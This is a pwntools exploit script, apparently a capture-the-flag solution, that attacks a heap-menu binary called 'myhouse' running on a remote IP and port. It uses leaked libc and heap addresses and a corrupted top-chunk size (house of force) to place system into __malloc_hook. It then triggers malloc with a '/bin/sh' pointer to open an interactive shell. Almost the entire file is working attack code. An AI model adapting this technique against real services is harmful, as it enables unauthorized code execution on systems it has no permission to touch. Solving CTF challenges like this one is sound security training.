#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 139.59.117.189 --port 3008 ./myhouse
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./myhouse')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '139.59.117.189'
port = int(args.PORT or 3008)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *main+572
b *exit+21
b *main+172
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  './lib'

io = start()

def add(size,msg):
    io.sendlineafter("> ","2")
    io.sendlineafter(": ",str(size))
    io.sendlineafter(": ",str(msg))


libc = exe.libc

io.recvuntil("you: ")
puts = int(io.recvline()[:-1],16)
libc.address = puts - libc.sym['puts']
print hex(libc.address)

io.recvuntil("another: ")
heap_base = int(io.recvline()[:-1],16)
print hex(heap_base)

print hex(libc.sym['system'])

add(24,'/bin/sh'.ljust(24,"\x00")+p64(0xffffffffffffffff))

to = libc.address + 0x3af0a8

offset_malloc_hook = libc.sym['__malloc_hook'] - heap_base - 0x20 

add(offset_malloc_hook,'test')
add(0x20,p64(libc.sym['system']))

io.sendlineafter("> ","2")
io.sendlineafter(": ",str(heap_base-0x10))

io.interactive()

